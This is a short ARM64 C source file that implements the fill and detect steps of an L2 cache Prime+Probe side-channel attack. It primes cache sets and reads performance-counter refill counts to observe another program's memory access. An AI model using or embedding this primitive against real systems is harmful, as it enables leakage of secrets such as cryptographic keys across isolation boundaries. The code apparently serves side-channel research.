#include "side_channel_attacks.h"
#include "Load_Step.h"
#include "cache_helpers_a64.h"

void L2_prime_probe_detect(unsigned char* buffer_ptr)
{
    unsigned char* l2_refill_buffer = buffer_ptr;

	unsigned int l2_refill_start, l2_refill_end;
    unsigned long val64;
    int i,k;

    // flush L1 cache
    dcache_ci_all_level1();

	for(i=0; i<L2_NUM_SETS; i++)
	{
        char* probe = data_pool + i * SIZE_CACHELINE;

		asm volatile ("dsb sy");
        asm volatile ("isb");
	    asm volatile ("mrs %0, pmevcntr2_el0":"=r" (l2_refill_start));
		asm volatile ("dsb sy");
        asm volatile ("isb");
        
        for (k=0; k<L2_ASSOCIATIVITY; k++)
        {
            asm volatile("LDR %0, [%1]\n\t": "=r" (val64): "r" (probe));
            asm volatile ("dsb sy");
            asm volatile ("isb");

            probe += SIZE_CACHELINE * L2_NUM_SETS;
        }

		asm volatile ("mrs %0, pmevcntr2_el0":"=r" (l2_refill_end));
		asm volatile ("dsb sy");
        asm volatile ("isb");

        *l2_refill_buffer++ = (unsigned char)(l2_refill_end - l2_refill_start);
	}

    // optional. write -1 for identification
    *l2_refill_buffer++ = (unsigned char)(255);
}

void L2_prime_probe_fill(unsigned char* buffer_ptr)
{
    unsigned long val64;
    int i,j,k;

	for(i=0; i<L2_NUM_SETS; i++)
	{
        // repeat due to radom replacement policy
		for(j=0; j<3; j++)
		{
            char* probe = data_pool + i * SIZE_CACHELINE;
            for (k=0; k<L2_ASSOCIATIVITY; k++)
            {
                asm volatile("LDR %0, [%1]\n\t": "=r" (val64): "r" (probe));
                asm volatile ("dsb sy");
                asm volatile ("isb");

                probe += SIZE_CACHELINE * L2_NUM_SETS;
            }
		}
	}
}